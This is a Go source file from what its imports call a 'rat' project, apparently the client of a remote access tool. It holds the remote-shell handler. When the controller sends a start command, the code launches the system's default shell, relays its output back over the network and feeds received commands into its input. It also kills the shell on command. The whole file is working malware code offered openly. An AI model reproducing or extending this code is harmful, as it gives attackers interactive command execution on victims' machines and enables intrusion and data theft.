package main

import (
	"bufio"
	"fmt"
	"io"
	"os/exec"
	"rat/client/shell"
	"rat/shared"
	"rat/shared/network/header"
)

type ShellPacket struct {
	Action int    `network:"receive"`
	Data   string `network:"send,receive"`
}

var current struct {
	process *exec.Cmd
	stdin   io.WriteCloser
	stdout  io.ReadCloser
}

func (packet ShellPacket) Header() header.PacketHeader {
	return header.ShellHeader
}

func (packet *ShellPacket) Init() {

}

func (packet ShellPacket) OnReceive() error {
	switch packet.Action {
	case shared.ShellStart:
		current.process = exec.Command(shell.GetDefault())
		current.stdin, _ = current.process.StdinPipe()
		current.stdout, _ = current.process.StdoutPipe()

		current.process.Start()

		go func() {
			reader := bufio.NewReader(current.stdout)

			for {
				s, err := reader.ReadString('\n')
				if err != nil {
					fmt.Println(err.Error())
					break
				}

				Queue <- &ShellPacket{Data: s}
			}
		}()
	case shared.ShellStop:
		current.process.Process.Kill()
		current.process = nil
	case shared.ShellWrite:
		current.stdin.Write([]byte(packet.Data + shell.LineEnd))
	}

	return nil
}
